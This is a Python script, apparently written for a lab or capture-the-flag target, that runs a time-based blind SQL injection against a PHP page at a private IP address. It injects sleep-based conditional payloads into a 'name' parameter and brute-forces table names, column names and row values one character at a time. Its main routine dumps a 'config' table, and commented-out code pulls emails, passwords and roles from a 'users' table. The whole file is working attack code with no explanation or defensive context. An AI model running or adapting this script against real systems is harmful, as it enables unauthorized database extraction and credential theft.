import requests
import time
from typing import List

alphabet = [c for c in '_@ .:0123456789abcdefghijklmnopqrstuvwxyz']


def test_payload(payload: str) -> bool:
    start = time.time()
    # requests.get(f"http://10.102.9.238/regards.php?email=y' OR IF({payload},sleep(0.01),0) AND '1'='1")
    requests.get(f"http://10.102.9.238/s3cret_manag3r_pag3.php?name=a' OR IF({payload},sleep(0.01),0) AND '1'='1")
    end = time.time()
    if end - start >= 0.01:
        return True
    else:
        return False


def test():
    print(test_payload("1=1"))
    print(test_payload("1=2"))


def brute_tables(tables: List[str] = None, current_str=""):
    if tables is None:
        tables = []
    for c in alphabet:
        next_str = current_str + c
        if test_payload(f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '{next_str}%')>0"):
            if test_payload(f"(SELECT COUNT(*) FROM information_schema.tables WHERE table_name='{next_str}')>0"):
                tables.append(next_str)
            print(next_str)
            brute_tables(tables, next_str)
    return tables


def brute_cols(table: str, cols: List[str] = None, current_str=""):
    if len(current_str) > 10:
        return cols
    if cols is None:
        cols = []
    for c in alphabet:
        next_str = current_str + c
        if test_payload(f"(SELECT COUNT(*) FROM information_schema.columns WHERE column_name LIKE '{next_str}%' AND table_name='{table}')>0"):
            if test_payload(f"(SELECT COUNT(*) FROM information_schema.columns WHERE column_name='{next_str}' AND table_name='{table}')>0"):
                cols.append(next_str)
            print(next_str)
            brute_cols(table, cols, next_str)
    return cols


def brute_data(table: str, col: str, data: List[str] = None, current_str = "", known_data: List[str] = None):
    if data is None:
        data = []
    if known_data is None:
        known_data = ['1=1']
    known_data_str = " AND ".join(known_data)
    for c in alphabet:
        next_str = current_str + c
        if test_payload(f"(SELECT COUNT(*) FROM {table} WHERE {col} LIKE '{next_str}%' AND {known_data_str})>0"):
            if test_payload(f"(SELECT COUNT(*) FROM {table} WHERE {col}='{next_str}' AND {known_data_str})>0"):
                data.append(next_str)
            print(next_str)
            brute_data(table, col, data, next_str, known_data)
    return data


def main():
    # print(brute_tables([]))
    # input()
    print(brute_cols('config'))
    input()
    data = []
    names = brute_data('config', 'name')
    for name in names:
        value = brute_data('config', 'value', known_data=[f"name='{name}'"])[0]
        data.append((name, value))
    # data = []
    # emails = brute_data('users', 'email')
    # for email in emails:
    #     name = brute_data('users', 'name', known_data=[f"email='{email}'"])[0]
    #     password = brute_data('users', 'password', known_data=[f"email='{email}'"])[0]
    #     role = brute_data('users', 'role', known_data=[f"email='{email}'"])[0]
    #     data.append((email, name, password, role))

    print("===================================================")
    for row in data:
        row_str = ''
        for item in row:
            row_str += item.ljust(30)
        print(row_str)


main()
